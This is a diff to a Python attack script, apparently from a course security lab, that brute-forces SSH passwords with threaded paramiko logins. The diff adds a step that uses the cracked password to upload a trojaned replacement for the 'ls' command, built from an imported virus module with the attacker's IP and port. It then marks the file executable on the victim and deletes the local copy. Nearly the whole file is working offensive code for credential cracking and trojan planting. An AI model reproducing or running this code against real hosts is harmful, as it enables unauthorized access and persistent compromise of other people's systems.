@@ -1,36 +1,39 @@
 #!/usr/bin/python3
-import itertools, paramiko, sys
+import itertools, paramiko, sys, os
 import threading
+from virus import zip_ls, build_virus
 
-def try_ssh(victim_ip, attacker_ip, attacker_port, pswd):
+def try_ssh(victim_ip: str, pswd: str):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
         print(f'Trying password: {pswd}')
         client.connect(victim_ip, username='csc2024', password=pswd)
-    # except paramiko.ssh_exception.AuthenticationException as e:
-    #     # print(f'{e}')
-    #     client.close()
-    #     return False
-    # except paramiko.ssh_exception.SSHException:
-    #     # print(f'{e}')
-    #     client.close()
-    #     return False
-    except:
+    except paramiko.ssh_exception.AuthenticationException as e:
+        # print(f'{e}')
+        client.close()
+        return False
+    except paramiko.ssh_exception.SSHException:
+        # print(f'{e}')
+        client.close()
+        return False
+    except EOFError:
         client.close()
         return False
     else:
         # print(f'Password found: {pswd}')
         return True
 
-def crack_ssh(victim_ip, attacker_ip, attacker_port, pswds):
+
+def crack_ssh(victim_ip: str, attacker_ip: str, attacker_port: int, pswds: list):
     global vctm_pswd
     for p in pswds:
-        if try_ssh(victim_ip, attacker_ip, attacker_port, p):
+        if try_ssh(victim_ip, p):
             print(f'Password found: {p}')
             vctm_pswd = p
         if vctm_pswd != "":
             break
+
 
 def get_victim_data():
     dic = list()
@@ -49,14 +52,29 @@ def get_victim_data():
             pwd_dic[i].append(pwd)
     return pwd_dic
 
+
+def send_ls(vctm_ip: str, atkr_ip: str, atkr_port: int):
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect(vctm_ip, username='csc2024', password=vctm_pswd)
+    build_virus(atkr_ip, atkr_port, zip_ls())
+    sftp = client.open_sftp()
+    sftp.put('./fake_ls', '/app/ls')
+    client.exec_command('chmod +x /app/ls')
+    client.close()
+
+
 if __name__ == '__main__':
-    # if len(sys.argv) != 4:
-    #     print(f'Usage: {sys.argv[0]} <victim_ip> <attacker_ip> <attacker_port>')
-    #     sys.exit(1)
-    # crack_ssh(sys.argv[1], sys.argv[2], sys.argv[3])
+    if len(sys.argv) != 4:
+        print(f'Usage: {sys.argv[0]} <victim_ip> <attacker_ip> <attacker_port>')
+        sys.exit(1)
+    vctm_ip = sys.argv[1]
+    atkr_ip = sys.argv[2]
+    atkr_port = sys.argv[3]
+
     pswds_dict = get_victim_data()
     vctm_pswd = ""
-    t_num = 16
+    t_num = 5
     threads = [0] * t_num
     for key in pswds_dict:
         for i in range(0, t_num):
@@ -64,14 +82,16 @@ if __name__ == '__main__':
                 break
             if i == t_num-1:
                 threads[i] = threading.Thread(target=crack_ssh,\
-                    args=('172.18.0.3', '172.18.0.2', '33333',\
+                    args=(vctm_ip, atkr_ip, atkr_port,\
                     pswds_dict[key][i*len(pswds_dict[key])//t_num:len(pswds_dict[key])]))
             else:
                 threads[i] = threading.Thread(target=crack_ssh,\
-                    args=('172.18.0.3', '172.18.0.2', '33333',\
+                    args=(vctm_ip, atkr_ip, atkr_port,\
                     pswds_dict[key][i*len(pswds_dict[key])//t_num:(i+1)*len(pswds_dict[key])//t_num]))
             threads[i].start()
         if vctm_pswd != "":
             break
         for j in range(0, t_num):
             threads[j].join()
+    send_ls(vctm_ip, atkr_ip, atkr_port)
+    os.system("rm ./fake_ls")
